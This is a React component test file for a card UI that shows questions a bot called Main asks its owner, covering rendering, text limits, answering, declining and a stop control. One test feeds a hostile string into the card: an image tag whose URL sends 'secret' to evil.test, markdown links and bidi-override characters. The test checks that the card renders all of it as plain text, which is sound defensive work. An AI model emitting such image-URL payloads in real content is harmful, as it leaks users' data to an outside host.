import { afterEach, expect, test } from "bun:test";
import { act } from "react";
import { createRoot, type Root } from "react-dom/client";

import { installDom } from "@/test/dom";
import { AskCards, AsksToggle } from "./AskCards";
import { ASK_STRINGS } from "./askStrings";
import type { AskRequest } from "./botsApi";
import type { Asks } from "./useAsks";

let restore: (() => void) | undefined;
let mounted: Root | undefined;
afterEach(() => {
  if (mounted) act(() => mounted!.unmount());
  mounted = undefined;
  restore?.();
  restore = undefined;
});

const request = (over: Partial<AskRequest> = {}): AskRequest => ({
  id: "r1",
  kind: "ask",
  state: "pending",
  askedAt: new Date(Date.now() - 3 * 3_600_000).toISOString(),
  expiresAt: new Date(Date.now() + 21 * 3_600_000).toISOString(),
  question: "Which colour?",
  outside: false,
  undelivered: false,
  ...over,
});

function asksWith(over: Partial<Asks> = {}): Asks & { decisions: unknown[]; stops: number } {
  const state = {
    decisions: [] as unknown[],
    stops: 0,
    support: "yes" as const,
    enabled: true,
    stopped: false,
    pending: [] as AskRequest[],
    outcomes: [],
    webOn: false,
    setEnabled: async () => "ok" as const,
    stop: async () => { state.stops++; return "ok" as const; },
    decide: async (_request: AskRequest, decision: unknown) => { state.decisions.push(decision); return "ok" as const; },
    refresh: () => {},
    ...over,
  };
  return state;
}

async function render(node: React.ReactElement) {
  restore = installDom();
  const host = document.createElement("div");
  document.body.append(host);
  const root = createRoot(host);
  mounted = root;
  await act(async () => root.render(node));
  return host;
}

const button = (host: Element, label: string) => [...host.querySelectorAll("button")].find((node) => node.textContent === label)!;
const type = async (area: HTMLTextAreaElement, value: string) => {
  await act(async () => {
    // happy-dom has no native `input` support, so React reads the change of the focused field on key events.
    area.focus();
    Object.getOwnPropertyDescriptor(window.HTMLTextAreaElement.prototype, "value")!.set!.call(area, value);
    area.dispatchEvent(new KeyboardEvent("keyup", { key: "a", bubbles: true }));
  });
};

test("the card has Monica's frame, the question as a quote, a relative age, one footer, Answer and Not now and the stop link", async () => {
  const host = await render(<AskCards asks={asksWith({ pending: [request()] })} />);
  const text = host.textContent!;
  expect(text).toContain("Main is asking:");
  expect(host.querySelector("[data-ask-question]")!.textContent).toBe("“Which colour?”");
  expect(text).toContain("Asked 3 hours ago");
  expect(text).toContain(ASK_STRINGS.footer);
  expect(text).toContain(ASK_STRINGS.answerHint);
  expect(button(host, "Answer")).toBeTruthy();
  expect(button(host, "Not now")).toBeTruthy();
  expect(button(host, "Stop Main from asking")).toBeTruthy();
  expect(host.querySelectorAll("[data-ask-card]")).toHaveLength(1);
});

test("the untrusted-content sentence shows only when the request says Main read something outside the chat", async () => {
  const quiet = await render(<AskCards asks={asksWith({ pending: [request()] })} />);
  expect(quiet.querySelector("[data-ask-outside]")).toBeNull();
  act(() => mounted!.unmount());
  mounted = undefined;
  restore?.();
  const loud = await render(<AskCards asks={asksWith({ pending: [request({ outside: true })] })} />);
  expect(loud.querySelector("[data-ask-outside]")!.textContent).toBe(ASK_STRINGS.outside);
});

test("the Web access line shows only while Web access is on", async () => {
  expect((await render(<AskCards asks={asksWith({ pending: [request()] })} />)).querySelector("[data-ask-web]")).toBeNull();
  act(() => mounted!.unmount());
  mounted = undefined;
  restore?.();
  expect((await render(<AskCards asks={asksWith({ pending: [request()], webOn: true })} />)).querySelector("[data-ask-web]")!.textContent).toBe(ASK_STRINGS.webAccessOn);
});

test("a question and choices from the box are plain text: no element, link or image, no hidden or bidi characters", async () => {
  const hostile = "<img src=\"https://evil.test/p.png?d=secret\"> [pay](https://evil.test/x) https://evil.test/bare\u202Eknab\u202C\u0007\nline two";
  const host = await render(<AskCards asks={asksWith({ pending: [request({ question: hostile, choices: ["<a href=\"https://evil.test\">yes</a>\u202E", "![i](https://evil.test/i.png)", "\u200b", "d", "e"] })] })} />);
  expect(host.querySelector("img, a, picture, source, video, iframe, object, embed, svg")).toBeNull();
  const quote = host.querySelector("[data-ask-question]")!;
  expect(quote.children).toHaveLength(0);
  expect(quote.textContent).toBe("“<img src=\"https://evil.test/p.png?d=secret\"> [pay](https://evil.test/x) https://evil.test/bare knab line two”");
  const labels = [...host.querySelectorAll("[data-ask-choices] button")].map((node) => node.textContent);
  expect(labels).toEqual(["<a href=\"https://evil.test\">yes</a>", "![i](https://evil.test/i.png)", "d"]);
  expect(host.querySelector("[data-ask-choices]")!.querySelectorAll("*")).toHaveLength(3);
});

test("text is cut at the limits: question 280, choice 60, at most four choices", async () => {
  const host = await render(<AskCards asks={asksWith({ pending: [request({ question: "q".repeat(500), choices: ["c".repeat(100), "2", "3", "4", "5"] })] })} />);
  expect([...host.querySelector("[data-ask-question]")!.textContent!]).toHaveLength(280 + 2);
  const labels = [...host.querySelectorAll("[data-ask-choices] button")].map((node) => node.textContent!);
  expect(labels).toHaveLength(4);
  expect([...labels[0]!]).toHaveLength(60);
});

test("Answer sends the typed words, 280 at most; a choice sends its index; Not now sends a decline", async () => {
  const asks = asksWith({ pending: [request({ choices: ["red", "blue"] })] });
  const host = await render(<AskCards asks={asks} />);
  const box = host.querySelector("textarea")!;
  expect(box.getAttribute("maxlength")).toBe("280");
  expect(button(host, "Answer").hasAttribute("disabled")).toBe(true);
  await type(box, "  green  ");
  await act(async () => { button(host, "Answer").click(); });
  await act(async () => { button(host, "blue").click(); });
  await act(async () => { button(host, "Not now").click(); });
  expect(asks.decisions).toEqual([{ decision: "answer", answer: "green" }, { decision: "answer", choice: 1 }, { decision: "decline" }]);
});

test("a refused decision keeps the card and says it did not go through", async () => {
  const host = await render(<AskCards asks={asksWith({ pending: [request()], decide: async () => "failed" })} />);
  await act(async () => { button(host, "Not now").click(); });
  expect(host.querySelector("[data-ask-card]")).not.toBeNull();
  expect(host.querySelector('[role="alert"]')!.textContent).toBe(ASK_STRINGS.sendFailed);
});

test("a declined request collapses to 'You said not now.' and an expired one to 'This question expired.', in chat only", async () => {
  const outcomes = [{ id: "a", kind: "declined" as const }, { id: "b", kind: "expired" as const }];
  const chat = await render(<AskCards asks={asksWith({ outcomes })} outcomes />);
  expect([...chat.querySelectorAll("[data-ask-outcome]")].map((node) => node.textContent)).toEqual(["You said not now.", "This question expired."]);
  expect(chat.querySelector("[data-ask-card]")).toBeNull();
  act(() => mounted!.unmount());
  mounted = undefined;
  restore?.();
  const home = await render(<AskCards asks={asksWith({ outcomes })} />);
  expect(home.querySelector("[data-ask-outcome]")).toBeNull();
});

test("Stop Main from asking turns the setting off through the controller, then the confirmation shows", async () => {
  const asks = asksWith({ pending: [request()] });
  const host = await render(<AskCards asks={asks} />);
  await act(async () => { button(host, "Stop Main from asking").click(); });
  expect(asks.stops).toBe(1);
  act(() => mounted!.render(<AskCards asks={{ ...asks, pending: [], enabled: false, stopped: true }} />));
  expect(host.querySelector("[data-ask-stopped]")!.textContent).toBe("Main won’t ask you questions. You can turn this back on in Settings.");
});

test("nothing shows when the service has no questions route", async () => {
  const host = await render(<AskCards asks={asksWith({ support: "no", pending: [request()] })} outcomes />);
  expect(host.innerHTML).toBe("");
});

test("the settings toggle is off by default and saves what the owner picks", async () => {
  const saved: boolean[] = [];
  const host = await render(<AsksToggle asks={asksWith({ enabled: false, setEnabled: async (value) => { saved.push(value); return "ok"; } })} />);
  const box = host.querySelector<HTMLInputElement>('input[type="checkbox"]')!;
  expect(box.checked).toBe(false);
  expect(host.textContent).toContain("Let Main ask you questions");
  expect(host.textContent).toContain(ASK_STRINGS.toggleHelp);
  await act(async () => { box.click(); });
  expect(saved).toEqual([true]);
});

test("the settings toggle is hidden until the service is known to have the setting", async () => {
  expect((await render(<AsksToggle asks={asksWith({ support: "no" })} />)).innerHTML).toBe("");
  act(() => mounted!.unmount());
  mounted = undefined;
  restore?.();
  expect((await render(<AsksToggle asks={asksWith({ support: "unknown" })} />)).innerHTML).toBe("");
});
